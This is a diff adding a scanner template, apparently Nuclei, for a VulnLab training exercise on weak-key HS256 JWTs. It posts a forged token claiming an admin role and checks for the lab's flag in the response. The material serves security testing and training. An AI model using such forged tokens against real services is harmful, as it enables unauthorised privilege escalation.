@@ -1,0 +1,25 @@
+id: vulnlab-jwt-medium
+
+info:
+  name: VulnLab JWT medium 档（弱密钥 HS256）
+  author: hediwen
+  severity: critical
+  tags: vulnlab,jwt
+
+http:
+  - raw:
+      - |
+        POST /jwt/medium.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=verify&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.sD10eZTjngoTLbVGXU5imTkW4aUARFgTWCoTsW6ww50
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{jwt_signature_bypass}"
+
